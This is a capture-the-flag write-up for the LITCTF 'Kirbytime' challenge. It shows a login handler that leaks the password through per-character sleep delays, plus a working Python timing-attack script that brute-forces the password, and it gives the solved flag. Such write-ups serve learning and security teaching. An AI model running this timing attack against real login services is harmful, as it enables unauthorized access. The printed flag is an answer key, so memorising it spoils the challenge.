---
title: Kirbytime
date : 2024-08-13 10:00:00 +0530
categories: [litctf , ctf]
tags: [litctf, ctf]
description: kirbytime
---

## Description

Welcome to Kirby's Website.

## Source Code

```python
@app.route('/', methods=['GET', 'POST'])
def login():
    message = None
    if request.method == 'POST':
        password = request.form['password']
        real = 'ABCDEFG'
        if len(password) != 7:
            return render_template('login.html', message="you need 7 chars")
        for i in range(len(password)):
            if password[i] != real[i]:
                message = "incorrect"
                return render_template('login.html', message=message)
            else:
                time.sleep(1)
        if password == real:
            message = "yayy! hi kirby"

    return render_template('login.html', message=message)
```

## Analysis

The website is a simple login page. We have to enter the correct password to get the flag. The password is the flag.

So the password checker is interesting. The first condition is very simple which is password is 7 characters long. The second condition is where the magic happens.

The 2nd function checks the password character by character. If the character is correct it waits for 1 second. If the character is incorrect it returns incorrect.

## How to abuse this

So the condition of `time.sleep(1)` helps us indicate if the character we entered is correct or not. If the character is correct it waits for 1 more second ie. Our wait time increases as the correct characters increase.

So we can bruteforce the password character by character. Which makes the usual `52^7` bruteforce to `52*7` bruteforce which is very doable. ( considering only alphabets )

## Bruteforce Script

So we can write a script where we calculate the delay and if the delay is increased we can move to the next character as that will be the correct character.

```python
import requests 
import time

url = "<url>"
def brute_password():
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    password = "aaaaaaa" #kBySlaY
    i = 0
    j = 0
    while True:
        while j < len(chars):
            starttime = time.time()
            response = requests.post(url, data={"password": password}).text
            endtime = time.time()

            if "yayy! hi kirby" in response:
                return password
            delay = endtime - starttime
            p = i
            i = int(delay)
            if i > p:
                j = 0
            print(delay)
            password = password[:i] + chars[j] + password[i+1:]
            print(password)
            j+=1

password = brute_password()
print(f"Password found: {password}")
```

Now this script does take some time ~30-40 minutes to get the flag. I tried to use conconcurrency but the server was not responding well to concurrent requests as it did on my local instance. So I had to go with a single request at a time approach.

> `Flag: LITCTF{kBySlaY}`

---

[back to index](/posts/LIT-Index/)